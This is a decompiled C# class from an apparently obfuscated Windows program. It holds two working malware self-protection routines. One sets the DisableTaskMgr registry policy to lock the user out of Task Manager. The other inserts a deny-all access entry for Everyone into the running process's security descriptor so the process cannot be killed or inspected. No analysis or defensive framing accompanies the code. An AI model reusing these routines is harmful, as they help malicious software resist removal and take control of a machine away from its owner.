using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace MufMaOSvGyvz
{
	// Token: 0x02000011 RID: 17
	internal class kernel
	{
		// Token: 0x0600004A RID: 74
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool GetKernelObjectSecurity(IntPtr JFruBjVvHaO, int tMPQDUfQDFtVn, [Out] byte[] iOESQxslYeYLWx, uint KSLIIIqbffaWrLa, out uint jxCwtQsOjul);

		// Token: 0x0600004B RID: 75
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool SetKernelObjectSecurity(IntPtr hGoxMTUtMZq, int TigQegujdRYeQCE, [In] byte[] efVMDYZOuLsMi);

		// Token: 0x0600004C RID: 76
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcess();

		// Token: 0x0600004D RID: 77
		public void DisableTaskManager(bool bool_0)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
				{
					registryKey.DeleteValue("DisableTaskMgr");
				}
				else
				{
					registryKey.SetValue("DisableTaskMgr", "1");
				}
				registryKey.Close();
			}
			catch
			{
			}
		}

		// Token: 0x0600004E RID: 78
		private RawSecurityDescriptor GetSecurityDescriptor(IntPtr intptr_0)
		{
			byte[] array = new byte[0];
			uint num;
			kernel.GetKernelObjectSecurity(intptr_0, 4, array, 0u, out num);
			if ((ulong)num > 32767UL)
			{
				throw new Win32Exception();
			}
			if (!kernel.GetKernelObjectSecurity(intptr_0, 4, array = new byte[num], num, out num))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(array, 0);
		}

		// Token: 0x0600004F RID: 79
		private void GetHandle(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
		{
			byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
			rawSecurityDescriptor_0.GetBinaryForm(array, 0);
			if (!kernel.SetKernelObjectSecurity(intptr_0, 4, array))
			{
				throw new Win32Exception();
			}
		}

		// Token: 0x06000050 RID: 80
		public void PushACERights()
		{
			IntPtr currentProcess = kernel.GetCurrentProcess();
			RawSecurityDescriptor securityDescriptor = this.GetSecurityDescriptor(currentProcess);
			securityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
			this.GetHandle(currentProcess, securityDescriptor);
		}
	}
}
